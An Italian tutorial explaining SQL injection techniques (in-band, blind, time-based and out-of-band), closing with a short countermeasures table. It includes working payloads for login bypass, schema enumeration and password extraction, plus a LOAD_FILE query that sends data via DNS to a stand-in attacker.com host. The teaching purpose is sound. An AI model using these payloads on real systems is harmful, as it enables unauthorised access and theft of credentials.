## Introduzione

SQL Injection si verifica quando un'applicazione web incorpora input fornito dall'utente direttamente in una query SQL senza un'adeguata sanificazione. L'input dell'attaccante viene trattato come codice SQL anziché come dati, consentendogli di alterare la logica della query e interagire con il database in modi non previsti dallo sviluppatore. Le conseguenze possono essere gravi: accesso non autorizzato a dati sensibili, bypass dell'autenticazione, modifica o cancellazione di record e, in alcuni casi, controllo completo del server di database.

## Nozioni SQL utili per l'injection

**Commenti SQL**: dicono al database di ignorare tutto ciò che segue sulla riga. In MySQL si usano `--` (doppio trattino seguito da uno spazio) o `#` per un commento su una riga, `/* */` per commenti multi-riga.

Servono per "tagliare" pulitamente il resto di una query originale quando si inietta a metà. Esempio, query originale:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='secret';
```

Iniettando `admin'--` come username, diventa:

```sql
SELECT * FROM users WHERE username='admin'-- AND password='secret';
```

**UNION**: combina i risultati di due o più `SELECT` in un unico set di risultati. Regola fondamentale: entrambe le query devono restituire lo stesso numero di colonne, con tipi di dato compatibili.

```sql
SELECT name, age FROM students UNION SELECT username, id FROM admins;
```

Viene usato per aggiungere una propria `SELECT` a una query legittima, estraendo dati da tabelle completamente diverse.

**LIKE e wildcard**: `LIKE` esegue pattern matching su stringhe. `%` corrisponde a qualsiasi sequenza di caratteri, `_` a esattamente un carattere.

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
```

**LIMIT**: limita il numero di righe restituite. La sintassi `LIMIT offset, count` permette di saltare righe e controllare l'output.

```sql
SELECT * FROM users LIMIT 1;       -- restituisce solo la prima riga
SELECT * FROM users LIMIT 2, 1;    -- salta 2 righe, restituisce la 3a
```

Nei payload di injection, `LIMIT` viene spesso usato per controllare quale riga viene restituita o per evitare output eccessivo.

**Funzioni stringa**:

- `GROUP_CONCAT()` aggrega valori di più righe in un'unica stringa separata da virgole:

```sql
SELECT GROUP_CONCAT(username, ':', password SEPARATOR '<br>') FROM users;
-- Restituisce: admin:pass123<br>martin:secret<br>jim:work456
```

- `CONCAT()` unisce singoli valori: `CONCAT(username, ':', password)` produce `admin:pass123` per una singola riga.

**Il database information_schema**: ogni server MySQL, MariaDB e PostgreSQL ha un database integrato chiamato `information_schema`, che contiene i metadati di tutti gli altri database: nomi di database, tabelle, colonne e tipi di dato. È la mappa che il database ha di se stesso.

Due tabelle sono particolarmente utili durante una SQL Injection:

- `information_schema.tables`: elenca ogni tabella. La colonna `table_schema` contiene il nome del database, `table_name` il nome della tabella.
- `information_schema.columns`: elenca ogni colonna. Le colonne `table_name` e `column_name` permettono di scoprire la struttura di qualsiasi tabella.

## In-Band SQLi

È la categoria più comune e più facile da sfruttare. "In-band" significa che lo stesso canale di comunicazione usato per inviare l'iniezione viene usato anche per ricevere i risultati: si inietta tramite una richiesta web e si vedono i dati estratti direttamente nella risposta della pagina.

### Error-Based

Inserendo un apice singolo `'` in un parametro vulnerabile si può generare un errore come:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
```

Questo rivela diverse informazioni: il database è MySQL, l'input è racchiuso tra apici singoli e l'applicazione non gestisce gli errori in modo elegante. Da qui si possono costruire payload più precisi per estrarre informazioni tramite messaggi di errore specifici.

### Union-Based

È il metodo principale per estrarre grandi quantità di dati. Usa l'operatore `UNION` per aggiungere una propria `SELECT` a quella originale, recuperando dati da qualsiasi tabella a cui l'utente del database ha accesso. La metodologia segue una serie di passaggi.

1. **Determinare il numero di colonne**: si inserisce `UNION SELECT` con un numero crescente di valori finché l'errore non scompare:

```sql
1 UNION SELECT 1          -- errore (numero colonne sbagliato)
1 UNION SELECT 1,2        -- errore (ancora sbagliato)
1 UNION SELECT 1,2,3      -- successo! La tabella ha 3 colonne
```

2. **Identificare quali colonne sono visualizzate**: non tutte le colonne vengono per forza mostrate a schermo. Si cambia il valore della query originale in qualcosa che non restituisce risultati (come `0`), così viene mostrato solo l'output della `UNION`:

```sql
0 UNION SELECT 1,2,3
```

3. **Estrarre il nome del database**: si sostituisce la posizione della colonna visibile con la funzione `database()`:

```sql
0 UNION SELECT 1,2,database()
```

4. **Enumerare le tabelle**: si usa `information_schema.tables` per elencare tutte le tabelle del database target:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

5. **Enumerare le colonne**: individuata una tabella interessante, se ne ottengono i nomi delle colonne:

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

6. **Estrarre i dati**: con tabella e colonne note, si estraggono i dati veri e propri:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

Questo restituisce tutti gli username e password in formato leggibile.

## Blind SQLi

In una SQL injection "classica" i dati estratti compaiono a schermo. Ma spesso l'applicazione non restituisce mai il risultato della query: in questi casi si parla di injection *blind* (cieca). L'iniezione funziona, ma manca un canale di output da cui leggere, quindi bisogna dedurre se l'iniezione è andata a buon fine dal comportamento dell'applicazione: l'utente è riuscito ad accedere? Il contenuto della pagina è cambiato? La risposta ha impiegato più tempo del previsto?

### Authentication Bypass

La maggior parte dei moduli di accesso invia username e password al server, che costruisce una query simile a:

```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

Inserendo come username `' OR 1=1;--` (in alternativa `' OR 1=1#` oppure `= OR 1=1--`) e qualsiasi cosa come password, il server costruisce:

```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

Se si conosce il nome utente dell'amministratore si può iniettare `admin'--`, che produce:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

La verifica della password viene completamente commentata: il database restituisce la riga dell'amministratore e si accede senza bisogno della password.

### Boolean-Based

Anche quando i dati non sono visibili, l'applicazione spesso si comporta in due modi distinguibili a seconda che la condizione iniettata sia vera o falsa. Questa differenza vero/falso è l'unico bit di informazione per richiesta. Il segnale può assumere molte forme: un JSON diverso, una pagina più lunga o più corta, un elemento HTML che appare o scompare. L'importante è solo poter distinguere i due stati. L'idea chiave è interrogare il database a colpi di domande sì/no.

Consideriamo il seguente codice:

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

1. **Determinare il numero di colonne**:  lo facciamo ponendo una condizione sempre vera. Questo ci aiuta anche a capire se il form è vulnerabile a questa iniezione.

```sql
admin123' UNION SELECT 1 WHERE database() LIKE '%';-- 		-- errore (numero colonne sbagliato)
admin123' UNION SELECT 1,2 WHERE database() LIKE '%';-- 	-- errore (numero colonne sbagliato)
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--   -- successo (numero colonne esatto)
```



2. **Estrarre il nome del database:** Si sostituisce poi il jolly con lettere specifiche, procedendo carattere per carattere:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'c%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'd%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'da%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'db%';--
...
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'db_name%';--
```

3. **Identificare il nome delle tabelle:** Trovato il database, si applica la stessa identica tecnica per scendere nella gerarchia dei dati, interrogando `information_schema`:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'b%';--
....
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'users%';--
```

4. **Identifichiamo le colonne:** Trovata una tabella, diciamo `users`, passiamo a enumerare le sue colonne.

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'b%';--
.....
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'username%';--
```
5.**Estrarre i dati:** Supponiamo di aver trovato le colonne `username` e `password`. Continuiamo cercando gli utenti con:

```sql
admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
admin123' UNION SELECT 1,2,3 from users where username like 'aa%';--
admin123' UNION SELECT 1,2,3 from users where username like 'ab%';--
....
admin123' UNION SELECT 1,2,3 from users where username like 'admin%';--
```

Supponiamo di aver trovato  `admin`.  Cerchiamo la sua password con
```sql
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '1%';-
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '2%';--
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';-
...
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '4321%';-
```

### Time-Based

Utile quando l'applicazione non fornisce alcun elemento visivo su cui lavorare: la pagina appare identica indipendentemente da ciò che si inietta, stesso contenuto, stesso codice di stato, stesse intestazioni. L'unico segnale disponibile è il tempo impiegato dalla risposta.

La funzione MySQL `SLEEP()` mette in pausa l'esecuzione della query per un numero predefinito di secondi. Aggiungendo una condizione, il database si mette in pausa solo quando la condizione è vera:

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

Se il nome del database inizia con "s", la risposta richiede circa 5 secondi, altrimenti è immediata.

**Passaggio 1 — numero di colonne**: stessa idea del Union-Based, si prova `UNION SELECT SLEEP(5)` aggiungendo colonne finché non compare un ritardo:

```sql
admin123' UNION SELECT SLEEP(5);--        -- nessun ritardo (numero sbagliato)
admin123' UNION SELECT SLEEP(5),2;--      -- ritardo di 5 secondi (2 colonne!)
```

**Passaggio 2 — enumerazione dei dati**: il processo è identico al boolean-based, scorrendo i caratteri con `LIKE`, ma invece di controllare il contenuto della pagina si osserva l'orologio. Ritardo = vero, nessun ritardo = falso.

## Out-Of-Band SQLi

L'OOB entra in gioco quando tutto il resto fallisce:

- l'In-Band non è un'opzione perché l'app non mostra risultati delle query né errori;
- il boolean-based non funziona perché la risposta appare sempre uguale, indipendentemente dalla condizione;
- il time-based non è affidabile perché la rete è troppo disturbata o `SLEEP()` è bloccata;
- ma il server di database **può** effettuare connessioni in uscita — questo è il requisito fondamentale. Se il firewall blocca tutto il traffico in uscita dal database, OOB non funziona.

Quando ogni altra via è bloccata e il database ha accesso alla rete, può essere l'unico modo per estrarre dati.

Sono coinvolti due canali:

1. il **canale di attacco**: la normale richiesta web con il payload di iniezione;
2. il **canale dati**: una richiesta di rete in uscita (DNS o HTTP) che il server di database invia verso un server controllato dall'attaccante, con i dati esfiltrati incorporati nella richiesta stessa.

### Esfiltrazione DNS

L'idea OOB ribalta l'approccio: invece di far tornare i dati attraverso la risposta, si costringe il **database stesso a spedirli** attraverso un canale completamente diverso — in questo caso il DNS. Non si aspetta un vero/falso: si aspetta che arrivi un pacchetto a un server controllato dall'attaccante. Un solo colpo può portare via l'intero valore, non un carattere.

Il DNS è il canale OOB ideale per un motivo pratico: è quasi sempre permesso in uscita. Un server può avere un firewall durissimo che blocca HTTP, FTP e tutto il resto, ma se non riesce a risolvere i nomi di dominio non funziona quasi niente, quindi il DNS resta tipicamente aperto.

C'è anche un secondo motivo, più sottile: la risoluzione DNS è ricorsiva e delegante. Se il database prova a risolvere `webapp_db.attacker.com`, la richiesta viene inoltrata di resolver in resolver fino ad arrivare al name server autoritativo per `attacker.com`, cioè l'attaccante. Non serve che il database contatti direttamente l'IP dell'attaccante: è la rete DNS a consegnare il messaggio per suo conto.

Sul name server autoritativo per `attacker.com` arriva quindi una query per `webapp_db.attacker.com`. Registrando i log e guardando il sottodominio si legge `webapp_db`: i dati sono nel sottodominio, consegnati dal database stesso, senza doverlo interrogare carattere per carattere.

**Esempio**: il trucco più comune per MySQL, se non disabilitato, consiste nell'usare `LOAD_FILE()` per attivare una ricerca DNS, incorporando i dati desiderati come sottodominio:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

Cosa succede:

1. `(SELECT database())` estrae il nome del database, ad esempio `webapp_db`.
2. `CONCAT()` costruisce la stringa `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` tenta di leggere quel percorso file. Su Windows, questo avvia una ricerca DNS per `webapp_db.attacker.com`.
4. Il server DNS dell'attaccante intercetta la richiesta e registra `webapp_db`: i dati si trovano nel sottodominio.

Questa tecnica funziona al meglio sui server MySQL basati su Windows, dove i percorsi UNC attivano la risoluzione DNS.

## Contromisure

Di seguito il quadro d'insieme per le contromisure da prendere per evitare attacchi tipo SQLi.

| Difesa | Cosa fa | Risolve la causa? |
|---|---|---|
| Prepared Statements | Tiene separati comando e dati | Sì |
| Input Validation (allowlist) | Accetta solo dati della forma giusta | No, aiuta |
| Escaping | Neutralizza i caratteri speciali | Solo in parte, fragile |
| Least Privilege | Riduce i danni possibili | No, limita le conseguenze |
| WAF | Blocca attacchi già conosciuti | No, aggirabile |
